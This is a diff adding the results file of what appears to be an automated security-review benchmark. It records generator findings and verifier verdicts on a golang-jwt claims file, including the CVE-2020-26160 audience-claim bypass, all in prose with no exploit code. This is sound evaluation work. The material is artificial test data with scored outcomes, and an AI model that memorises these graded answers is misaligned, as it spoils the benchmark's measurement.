+            "rationale": "The finding concludes \"no function body follows\" from a diff that is visibly truncated (it ends mid-sentence on `// Compares the exp claim against cmp.`), so the shown snippet does not represent the full file. This is recognizable golang-jwt source, where `StandardClaims.Valid()` is a concrete method enforcing exp/nbf/iat and is mandatory to satisfy the `jwt.Claims` interface \u2014 the two blank lines before `// ----- helpers` are exactly where that body belongs. Moreover, a genuinely absent `Valid()` would cause a compile error (interface not satisfied), not the silent acceptance of expired tokens the finding describes, making the asserted exploit path unlikely. I cannot positively confirm the method's presence without the full file, so this is a probable false positive rather than a certain one.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-863",
+          "description": "verifyAud only supports comparing a single audience string against a single expected value using constant-time compare. There is no support for multiple intended audiences or for an 'aud' array containing several values where only one needs to match the expected audience, which is standard JWT usage. This may lead either to false negatives (breaking legitimate multi-audience tokens, prompting developers to disable audience checks entirely) or false positives in downstream custom handling, increasing the risk of audience-restriction bypass being 'worked around' insecurely.",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": 20,
+          "remediation": "Implement proper RFC 7519-compliant audience validation supporting both a single string and an array of strings, matching if any entry equals the expected audience.",
+          "severity": "low",
+          "title": "Audience comparison ignores case/format normalization and multi-value lists",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "I'd revise upward if: (a) call sites in the broader library default `required`/`req` to false while advertising audience validation as enforced, making array-aud tokens silently pass; (b) there exists a parallel code path that unmarshals aud into []string and treats a non-matching array as valid; or (c) the public API documentation/tests claim multi-audience arrays are validated, creating a true expectation gap that an attacker could exploit via an array containing only unintended audiences.",
+            "rationale": "The security framing does not survive scrutiny. (1) Case/format normalization is explicitly NOT wanted: RFC 7519 \u00a74.1.3 defines aud as case-sensitive StringOrURI values, so the exact ConstantTimeCompare is the correct, spec-compliant behavior \u2014 adding normalization would introduce a bypass, not fix one. (2) The multi-value limitation resolves to fail-closed behavior: when aud is a JSON array, the string type assertion yields \"\", and with required=true verifyAud returns false (rejects), which is the safe direction and not an authorization bypass. With required=false it returns true, but that is the explicitly documented \"matches or is unset\" opt-out semantic, not a defect introduced here. (3) The \"false positives in downstream custom handling\" is speculation about code not present in the diff. The real issue is a feature-completeness/usability gap (legitimate multi-aud tokens get rejected), not CWE-863 incorrect authorization in this code.",
+            "upheld": false
+          }
+        }
+      ],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-287",
+          "description": "VerifyAudience retrieves the 'aud' claim with a strict type assertion `m[\"aud\"].(string)`. Per RFC 7519, the 'aud' claim MAY be a JSON array of strings (not just a single string). If a token's 'aud' value is an array or any non-string JSON type, the assertion fails silently (aud becomes the zero value \"\"), and verifyAud() then treats the claim as absent. When the caller passes required=false, verifyAud returns true (i.e., 'valid') even though the actual audience value never matched 'cmp'. This allows an attacker to craft a token whose audience claim is a non-string type to bypass audience restriction checks, potentially letting a token intended for a different service/audience be accepted.",
+          "file": "map_claims.go",
+          "hit": true,
+          "line": 32,
+          "remediation": "Handle both string and []string/[]interface{} forms of the 'aud' claim, normalizing to a slice and checking membership. Do not default to 'valid' solely because a type assertion failed; distinguish between 'claim absent' and 'claim present but unparseable', treating the latter as invalid when required or when any claim value exists.",
+          "severity": "high",
+          "title": "Audience (aud) claim validation bypass via type confusion",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "Evidence that would flip this: (1) every caller of VerifyAudience passes req=true, or an additional/independent audience check exists before trust decisions; (2) MapClaims is populated by a decoder that coerces aud arrays to a single string before this code runs; (3) this VerifyAudience is never reached in the default validation path and no production code invokes it with req=false; (4) a later hunk (file is truncated) adds array-aware handling (e.g. a ClaimStrings type) that supersedes this path.",
+            "rationale": "The type-assertion behavior is verified: `aud, _ := m[\"aud\"].(string)` yields \"\" (no panic) whenever the JSON `aud` is an array or any non-string, which RFC 7519 \u00a74.1.3 explicitly permits. `verifyAud(\"\", cmp, false)` then hits `if aud == \"\" { return !required }` and returns true, treating a present-but-wrong-type audience as if the claim were absent. Under required=true it fails safe (returns false), so the finding is correctly scoped to required=false. The strongest disproof attempt \u2014 that required=false is meant to tolerate a missing claim \u2014 fails, because an array aud is a present, specific, non-matching audience (e.g. a token minted for another service), not a missing one; coercing it to the \"absent\" branch is a genuine audience-restriction bypass. This is a near-verbatim reproduction of CVE-2020-26160 (dgrijalva/jwt-go). I could not find parameterization, upstream coercion, or framework guarantees that neutralize it; encoding/json decodes JSON arrays to []interface{}, so the assertion genuinely fails.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": null,
+      "generator_only": [
+        {
+          "confidence": "low",
+          "cwe": "CWE-613",
+          "description": "The new file ends mid-comment (\"// Compares the exp claim against cmp.\") with no accompanying implementation of VerifyExpiresAt, VerifyNotBefore, VerifyIssuedAt, or the Valid() method referenced in the preceding comment (\"// Valid implements Valid from Claims\"). If this reflects the actual shipped code (as opposed to a diff-rendering artifact), it means core time-based claim validation (exp/nbf/iat) and the overall Valid() contract are missing or incomplete. A JWT claims-validation library that silently omits expiration/not-before checks would allow expired or not-yet-valid tokens to be accepted, which is a critical authentication bypass. This must be verified against the full source file.",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": null,
+          "remediation": "Ensure VerifyExpiresAt, VerifyNotBefore, VerifyIssuedAt, and Valid() are fully implemented, return explicit errors on expired/not-yet-valid/malformed claims, and are covered by unit tests asserting fail-closed behavior when the corresponding claim is missing or of an unexpected type.",
+          "severity": "critical",
+          "title": "File is truncated before claim expiration/validity logic is implemented"
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-697",
+          "description": "VerifyAudience's type switch on the 'aud' claim only handles `string` and `[]string`. When a JWT is parsed from JSON into MapClaims (map[string]interface{}), a JSON array claim such as [\"a\",\"b\"] unmarshals to []interface{}, not []string. This case falls into `default: return false`, meaning any token with an audience array will always fail validation, regardless of whether the audience actually matches. While this currently fails closed (denies access) rather than granting unauthorized access, it indicates a type-handling defect in security-critical validation logic. Depending on how calling code treats a `false` return (e.g., some integrations may catch/ignore validation errors or have compensating but insecure fallback logic), this kind of inconsistency in a security primitff can mask bugs that, when 'fixed' incorrectly, reintroduce bypasses.",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": null,
+          "remediation": "Add a case for []interface{} that type-asserts each element to string (rejecting the whole claim if any element is not a string) before comparison, matching the behavior of upstream jwt-go/golang-jwt implementations.",
+          "severity": "medium",
+          "title": "VerifyAudience does not handle []interface{} (the actual JSON-unmarshaled type for array claims)"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-208",
+          "description": "verifyAud iterates the audience list and returns immediately on the first constant-time match. While each individual string comparison is constant-time, the overall loop is not constant-time with respect to which position in the list matched (or whether it matched at all vs. iterating the whole list on no match). This introduces a low-value timing side channel. Audience values are not typically secret, so impact is minimal, but it is worth noting since subtle.ConstantTimeCompare was explicitly chosen to resist timing attacks and the surrounding loop structure undermines that intent.",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": null,
+          "remediation": "If timing-safety of the audience check matters for the threat model, compare against all entries unconditionally (accumulate a constant-time OR of results) rather than returning early; otherwise document that audience values are not treated as secrets and ConstantTimeCompare is unnecessary.",
+          "severity": "low",
+          "title": "Audience comparison loop leaks match position via timing despite ConstantTimeCompare"
+        },
+        {
+          "confidence": "low",
+          "cwe": "CWE-190",
+          "description": "ExpiresAt, IssuedAt, and NotBefore are declared as raw int64 Unix timestamps with no indication of validation when converting from JSON (which may deliver these as float64/json.Number). Depending on the (unseen) parsing code, extremely large or negative values, or float64-to-int64 precision loss for timestamps beyond 2^53, could cause incorrect expiration calculations (e.g., an attacker-supplied huge exp value bypassing expiration, or overflow producing a negative/invalid result that is misinterpreted as 'not expired').",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": null,
+          "remediation": "Validate numeric claim ranges explicitly when decoding (reject NaN/Inf/out-of-range values), and consider using a well-tested dedicated NumericDate type as later versions of golang-jwt do, rather than raw int64/float64 claims.",
+          "severity": "medium",
+          "title": "Use of plain int64 for time-based claims (exp/iat/nbf) without range/overflow validation"
+        }
+      ],
+      "id": "cve-2020-26160-jwt-go-negative",
+      "is_vulnerable": false,
+      "rejected": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-208",
+          "description": "verifyAud iterates the audience list and returns immediately on the first constant-time match. While each individual string comparison is constant-time, the overall loop is not constant-time with respect to which position in the list matched (or whether it matched at all vs. iterating the whole list on no match). This introduces a low-value timing side channel. Audience values are not typically secret, so impact is minimal, but it is worth noting since subtle.ConstantTimeCompare was explicitly chosen to resist timing attacks and the surrounding loop structure undermines that intent.",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": null,
+          "remediation": "If timing-safety of the audience check matters for the threat model, compare against all entries unconditionally (accumulate a constant-time OR of results) rather than returning early; otherwise document that audience values are not treated as secrets and ConstantTimeCompare is unnecessary.",
+          "severity": "low",
+          "title": "Audience comparison loop leaks match position via timing despite ConstantTimeCompare",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "If `cmp` or the audience values were derived from confidential/secret material (e.g., a secret capability or token whose membership/ordering is meant to remain hidden), or if this comparison were reused in a context where the audience set is not derivable by the requester, the position/match-timing leak would become security-relevant and the finding should be upheld. Seeing the full Valid()/VerifyAudience call sites and whether any caller passes secret-derived audience data would settle this.",
+            "rationale": "The finding's mechanical description is correct \u2014 the early-return loop is not constant-time with respect to match position or match-vs-no-match, nominally undermining the per-string ConstantTimeCompare. However, a timing side channel is only a security vulnerability if it leaks otherwise-inaccessible secret data. Here nothing secret is protected: the `aud` claim lives inside a base64url-encoded (unencrypted) JWT and is fully readable, including its ordering, by anyone holding the token; `cmp` is a value the verifier already knows. The only information the timing leaks (which entry matched / whether any matched) is already public via the readable token and via the function's ordinary boolean result. Reaching this path with arbitrary audience content also requires an authenticated (validly signed) token. Thus there is no exploitable oracle \u2014 the ConstantTimeCompare usage is defensive/non-essential and the loop structure introduces no actionable risk. This is a pedantic observation, not a real vulnerability.",
+            "upheld": false
+          }
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-190",
+          "description": "ExpiresAt, IssuedAt, and NotBefore are declared as raw int64 Unix timestamps with no indication of validation when converting from JSON (which may deliver these as float64/json.Number). Depending on the (unseen) parsing code, extremely large or negative values, or float64-to-int64 precision loss for timestamps beyond 2^53, could cause incorrect expiration calculations (e.g., an attacker-supplied huge exp value bypassing expiration, or overflow producing a negative/invalid result that is misinterpreted as 'not expired').",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": null,
+          "remediation": "Validate numeric claim ranges explicitly when decoding (reject NaN/Inf/out-of-range values), and consider using a well-tested dedicated NumericDate type as later versions of golang-jwt do, rather than raw int64/float64 claims.",
+          "severity": "medium",
+          "title": "Use of plain int64 for time-based claims (exp/iat/nbf) without range/overflow validation",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "The verification routines were truncated from the diff. I would revise upward if: (a) the `VerifyExpiresAt`/`Valid` implementation performs arithmetic on these timestamps that can overflow (e.g., `exp + leeway` or `exp * 1000`, or a multiplication converting seconds\u2192nanoseconds like `time.Unix(exp*1e9, 0)`) where a near-max int64 value wraps negative; (b) the MapClaims parsing does an unchecked `int64(float64Value)` and then compares in a way where a NaN/Inf or out-of-range float produces a misleading \"not expired\" result; or (c) there is custom unmarshaling (json.Number handling) that re-introduces silent truncation the standard int64 field path avoids. Seeing the actual exp/nbf comparison code and any unit conversion would be decisive.",
+            "rationale": "This finding is largely speculative and rests on explicitly \"unseen\" parsing code, and the concrete overflow/precision claims do not hold up against the actual framework behavior.\n\n1. For the `StandardClaims` struct shown, the time fields are typed `int64`. Go's `encoding/json` does NOT silently truncate or overflow when unmarshaling a JSON number into an `int64` field \u2014 a value exceeding int64 range produces an `*UnmarshalTypeError`, and a fractional value likewise fails. So \"float64-to-int64 precision loss\" and \"overflow producing a negative result\" cannot occur on this struct path; parsing simply fails and the token is rejected.\n\n2. The float64 precision concern only applies to the `MapClaims` (map[string]interface{}) path, where numbers decode as float64. But the threshold (2^53 \u2248 9\u00d710^15 seconds) corresponds to year ~285 million \u2014 not a reachable/attacker-relevant expiration boundary. Loss of precision there does not create an exploitable expiration bypass.\n\n3. The \"huge exp bypassing expiration\" scenario is not an overflow vulnerability: exp is checked against `now`, and the comparison `now < exp` does not overflow in a dangerous way. More importantly, an attacker setting a large exp still must produce a validly-signed token; exp content is not a signature bypass. A legitimately signed token with a far-future exp is working as designed, not CWE-190.\n\n4. Using int64 Unix seconds for exp/iat/nbf is the intentional, standard design of this (golang-jwt v3/v4-era) library, consistent with RFC 7519 NumericDate semantics.\n\nThe finding does not demonstrate any arithmetic path where attacker input produces a wrap-around that is misinterpreted as \"not expired.\" It reads as a theoretical CWE-190 flag rather than a concrete defect.",
+            "upheld": false
+          }
+        }
+      ],
+      "upheld": [
+        {
+          "confidence": "low",
+          "cwe": "CWE-613",
+          "description": "The new file ends mid-comment (\"// Compares the exp claim against cmp.\") with no accompanying implementation of VerifyExpiresAt, VerifyNotBefore, VerifyIssuedAt, or the Valid() method referenced in the preceding comment (\"// Valid implements Valid from Claims\"). If this reflects the actual shipped code (as opposed to a diff-rendering artifact), it means core time-based claim validation (exp/nbf/iat) and the overall Valid() contract are missing or incomplete. A JWT claims-validation library that silently omits expiration/not-before checks would allow expired or not-yet-valid tokens to be accepted, which is a critical authentication bypass. This must be verified against the full source file.",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": null,
+          "remediation": "Ensure VerifyExpiresAt, VerifyNotBefore, VerifyIssuedAt, and Valid() are fully implemented, return explicit errors on expired/not-yet-valid/malformed claims, and are covered by unit tests asserting fail-closed behavior when the corresponding claim is missing or of an unexpected type.",
+          "severity": "critical",
+          "title": "File is truncated before claim expiration/validity logic is implemented",
+          "verdict": {
+            "confidence": "low",
+            "context_that_would_change_this": "The complete contents of map_claims.go (the lines after line 48) would decisively settle this. Also relevant: (a) whether the package actually compiles (go build) \u2014 a compile failure disproves the \"silently accepts expired tokens\" bypass claim; (b) whether StandardClaims/MapClaims declare conformance to a Claims interface requiring Valid(), which would force a compile error if Valid() is absent; (c) confirmation of the diff-rendering pipeline's line limit, since a hunk header of \"@@ -0,0 +1,48 @@\" ending mid-comment is a classic truncation signature rather than genuine EOF.",
+            "rationale": "I attempted to disprove this finding but cannot conclusively do so from the available evidence, so I uphold it with low confidence. Adversarial analysis: (1) This file is recognizably from the golang-jwt/jwt library. In the real library, StandardClaims.Valid() and the MapClaims.Verify* methods (VerifyExpiresAt/VerifyNotBefore/VerifyIssuedAt) are fully implemented, so the \"missing logic\" is almost certainly a DISPLAY/diff-truncation artifact rather than shipped code. (2) The strongest reason to suspect a false positive: the finding itself hedges (\"If this reflects the actual shipped code... as opposed to a diff-rendering artifact\") \u2014 it is speculative by its own admission and raised on a diff, not the compiled file. (3) Critically, if this were truly the shipped file, the Go code would NOT COMPILE: StandardClaims is declared to implement the Claims interface (comment \"// Valid implements Valid from Claims\") but has no Valid() method body, and an incomplete method/comment at EOF is a syntax error. A non-compiling package cannot ship and cannot cause a runtime auth bypass \u2014 it would fail the build. This strongly argues against the critical-severity runtime-bypass characterization. However, I was given ONLY the diff text; I do not have the actual map_claims.go file on disk to read and confirm the full implementation exists below line 48. Because I cannot directly inspect the complete file to prove the validation logic is present, I cannot fully rule out an incomplete/broken change, so I do not reject the finding outright \u2014 but its practical impact is almost certainly a build failure (caught immediately), not a silent authentication bypass.",
+            "upheld": true
+          }
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-697",
+          "description": "VerifyAudience's type switch on the 'aud' claim only handles `string` and `[]string`. When a JWT is parsed from JSON into MapClaims (map[string]interface{}), a JSON array claim such as [\"a\",\"b\"] unmarshals to []interface{}, not []string. This case falls into `default: return false`, meaning any token with an audience array will always fail validation, regardless of whether the audience actually matches. While this currently fails closed (denies access) rather than granting unauthorized access, it indicates a type-handling defect in security-critical validation logic. Depending on how calling code treats a `false` return (e.g., some integrations may catch/ignore validation errors or have compensating but insecure fallback logic), this kind of inconsistency in a security primitff can mask bugs that, when 'fixed' incorrectly, reintroduce bypasses.",
+          "file": "map_claims.go",
+          "hit": false,
+          "line": null,
+          "remediation": "Add a case for []interface{} that type-asserts each element to string (rejecting the whole claim if any element is not a string) before comparison, matching the behavior of upstream jwt-go/golang-jwt implementations.",
+          "severity": "medium",
+          "title": "VerifyAudience does not handle []interface{} (the actual JSON-unmarshaled type for array claims)",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "1) The definition of MapClaims \u2014 if it is not map[string]interface{} (or if tokens are decoded via a custom decoder that coerces arrays to []string, e.g. using json.Decoder with a typed target), the issue would not arise. 2) The token parsing path \u2014 if this codebase only ever validates audience via StandardClaims/ClaimStrings (which has an UnmarshalJSON) rather than via MapClaims.VerifyAudience, the vulnerable branch may be unreachable. 3) Call sites of VerifyAudience and how a false return is consumed \u2014 needed to confirm whether the impact stays fail-closed or whether any caller actually has the speculated insecure fallback; absent that, the bypass framing remains unproven.",
+            "rationale": "The technical core of the finding is verifiably correct and I could not disprove it. `MapClaims` is `map[string]interface{}`, and Go's encoding/json unmarshals any JSON array into an interface{} as `[]interface{}`, never `[]string`. The type switch handles only `string` and `[]string`, routing every parsed array-audience token into `default: return false`. This matches a known regression from the canonical golang-jwt implementation, which includes a `case []interface{}:` arm this diff omits. So the defect is real: tokens with an `aud` array always fail audience validation regardless of actual match. However, the behavior fails CLOSED (denies access) \u2014 it is a correctness/availability bug, not a demonstrated authentication bypass. The finding's escalation toward bypass risk (\"compensating but insecure fallback logic\") is pure speculation with no supporting call site in the diff. Hence upheld as a legitimate security-primitive defect, but the medium severity rests on a hypothetical, not an exploitable, impact \u2014 confidence is medium, not high.",
+            "upheld": true
+          }
+        }
+      ]
+    }
+  ],
+  "tool_version": "0.1.0"
+}
